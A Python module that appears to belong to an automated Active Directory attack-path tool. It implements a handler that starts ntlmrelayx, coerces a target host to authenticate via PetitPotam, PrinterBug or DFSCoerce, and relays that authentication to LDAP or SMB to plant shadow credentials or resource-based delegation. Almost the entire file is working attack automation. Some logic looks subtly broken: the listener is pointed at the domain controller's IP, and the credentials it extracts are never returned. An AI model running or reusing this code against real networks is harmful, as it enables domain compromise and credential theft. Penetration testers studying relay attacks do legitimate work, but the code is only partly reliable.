"""Handler for authentication coercion and NTLM relay edge types.

Supports ``CoerceAndRelayTo`` and ``CoerceAndRelayNTLMToSMB`` BloodHound
edges.  The attack chain:

1. Start **ntlmrelayx** as a background relay listener targeting the
   relay destination (LDAP for shadow credentials / RBCD, or SMB).
2. Trigger authentication coercion (PetitPotam / PrinterBug / DFSCoerce)
   from the source machine, pointing it at the relay listener.
3. ntlmrelayx relays the captured NTLM authentication to the target.
4. Collect any credentials or delegations created by the relay.
5. Stop ntlmrelayx.

Rollback:
    Coercion is non-destructive.  Relay side-effects (RBCD, shadow
    credentials) are handled by subsequent edge handlers.
"""

from __future__ import annotations

import shutil

from pathstrike.engine.edge_registry import register_handler
from pathstrike.handlers.base import BaseEdgeHandler
from pathstrike.models import (
    Credential,
    CredentialType,
    EdgeInfo,
    RollbackAction,
)
from pathstrike.tools.coercion_wrapper import (
    run_dfscoerce,
    run_petitpotam,
    run_printerbug,
)
from pathstrike.tools import ntlmrelayx_wrapper as relay


@register_handler("CoerceAndRelayTo", "CoerceAndRelayNTLMToSMB")
class CoerceAndRelayHandler(BaseEdgeHandler):
    """Exploit authentication coercion + NTLM relay.

    Coercion methods attempted (in order of preference):
    - PetitPotam (MS-EFSRPC) — most reliable
    - PrinterBug (MS-RPRN) — requires Print Spooler
    - DFSCoerce (MS-DFSNM) — fallback

    Relay modes:
    - **LDAP** with ``--shadow-credentials`` (default for Computer → DC relay)
    - **LDAP** with ``--delegate-access`` (RBCD fallback)
    - **SMB** (for CoerceAndRelayNTLMToSMB edges)
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        if not shutil.which("ntlmrelayx.py"):
            return (
                False,
                "ntlmrelayx.py not found on PATH. "
                "Install via: pip install impacket",
            )

        coercion_tools = {
            "PetitPotam.py": "PetitPotam (MS-EFSRPC)",
            "printerbug.py": "PrinterBug (MS-RPRN)",
            "DFSCoerce.py": "DFSCoerce (MS-DFSNM)",
        }
        available = [d for n, d in coercion_tools.items() if shutil.which(n)]
        if not available:
            return (
                False,
                "No coercion tools found on PATH. Install at least one of: "
                "PetitPotam.py, printerbug.py, DFSCoerce.py",
            )

        return (
            True,
            f"Ready: ntlmrelayx + {', '.join(available)} available.",
        )

    async def exploit(
        self,
        edge: EdgeInfo,
        dry_run: bool = False,
    ) -> tuple[bool, str, list[Credential]]:
        source_user = self._resolve_principal(edge)
        dc_ip = self._get_dc_host()
        domain = self._get_domain()

        # Source node = machine to coerce
        source_host = edge.source.name.split("@")[0]
        # Target node = relay destination
        target_host = edge.target.name.split("@")[0]

        # Determine relay mode based on edge type and target
        is_smb_relay = edge.edge_type == "CoerceAndRelayNTLMToSMB"
        if is_smb_relay:
            relay_url = f"smb://{target_host}"
        else:
            relay_url = f"ldap://{dc_ip}"

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would start ntlmrelayx targeting {relay_url}, "
                f"then coerce {source_host} to authenticate. "
                f"Relay would create shadow credentials or RBCD delegation.",
                [],
            )

        # Get credentials for coercion
        cred = self.cred_store.get_best_credential(source_user, domain)
        if not cred:
            cfg = self.config.credentials
            username = cfg.username
            password = cfg.password
            nt_hash = cfg.nt_hash
        else:
            username = cred.username
            password = cred.value if cred.cred_type == CredentialType.password else None
            nt_hash = cred.value if cred.cred_type == CredentialType.nt_hash else None

        # --- Step 1: Start ntlmrelayx relay server -------------------------
        self.logger.info(
            "Starting ntlmrelayx relay to %s", relay_url,
        )

        use_shadow = not is_smb_relay
        use_delegate = False

        session = await relay.start_relay(
            target_url=relay_url,
            shadow_credentials=use_shadow,
            shadow_target=f"{source_host}$" if use_shadow else None,
            delegate_access=use_delegate,
        )

        if session.process.returncode is not None:
            stderr = "\n".join(session.stderr_lines)
            return (
                False,
                f"ntlmrelayx failed to start: {stderr}",
                [],
            )

        try:
            # --- Step 2: Trigger coercion -----------------------------------
            listener_ip = dc_ip  # ntlmrelayx listens on our machine
            coerce_result = await self._try_coercion(
                source_host=source_host,
                listener_ip=listener_ip,
                domain=domain,
                username=username,
                password=password,
                nt_hash=nt_hash,
            )

            if not coerce_result["success"]:
                return (
                    False,
                    f"All coercion methods failed: {coerce_result.get('error', 'unknown')}",
                    [],
                )

            self.logger.info(
                "Coercion triggered via %s, waiting for relay...",
                coerce_result.get("method", "unknown"),
            )

            # --- Step 3: Wait for relay to complete -------------------------
            relay_result = await relay.wait_for_relay(session, timeout=30)

            if not relay_result["success"]:
                return (
                    False,
                    f"Coercion succeeded ({coerce_result.get('method')}) but "
                    f"relay did not complete: {relay_result.get('error', 'timeout')}",
                    [],
                )

            # --- Step 4: Extract credentials --------------------------------
            output = relay_result.get("output", "")
            new_creds: list[Credential] = []

            device_id = relay.extract_shadow_creds_device_id(output)
            if device_id:
                self.logger.info(
                    "Shadow credentials created (DeviceID: %s)", device_id,
                )

            delegated = relay.extract_delegated_account(output)
            if delegated:
                self.logger.info(
                    "RBCD delegation created via %s", delegated,
                )

            return (
                True,
                f"Relay succeeded via {coerce_result.get('method')} → {relay_url}. "
                f"Output: {output[:500]}",
                new_creds,
            )

        finally:
            # --- Step 5: Always stop relay ----------------------------------
            await relay.stop_relay(session)

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        return None

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    async def _try_coercion(
        self,
        source_host: str,
        listener_ip: str,
        domain: str,
        username: str,
        password: str | None,
        nt_hash: str | None,
    ) -> dict:
        """Try coercion methods in order of preference.

        Returns a result dict with ``success``, ``method``, and ``error`` keys.
        """
        attempts: list[tuple[str, dict]] = []

        if shutil.which("PetitPotam.py"):
            self.logger.info("Trying PetitPotam: %s → %s", source_host, listener_ip)
            result = await run_petitpotam(
                listener_ip=listener_ip,
                target_ip=source_host,
                domain=domain,
                username=username,
                password=password,
                nt_hash=nt_hash,
            )
            attempts.append(("PetitPotam", result))
            if result["success"]:
                return {"success": True, "method": "PetitPotam", "output": result["output"]}

        if shutil.which("printerbug.py"):
            self.logger.info("Trying PrinterBug: %s → %s", source_host, listener_ip)
            result = await run_printerbug(
                listener_ip=listener_ip,
                target_ip=source_host,
                domain=domain,
                username=username,
                password=password,
                nt_hash=nt_hash,
            )
            attempts.append(("PrinterBug", result))
            if result["success"]:
                return {"success": True, "method": "PrinterBug", "output": result["output"]}

        if shutil.which("DFSCoerce.py"):
            self.logger.info("Trying DFSCoerce: %s → %s", source_host, listener_ip)
            result = await run_dfscoerce(
                listener_ip=listener_ip,
                target_ip=source_host,
                domain=domain,
                username=username,
                password=password,
                nt_hash=nt_hash,
            )
            attempts.append(("DFSCoerce", result))
            if result["success"]:
                return {"success": True, "method": "DFSCoerce", "output": result["output"]}

        error_summary = "; ".join(
            f"{name}: {r.get('error', 'unknown')}" for name, r in attempts
        )
        return {"success": False, "error": error_summary or "No coercion tools available"}
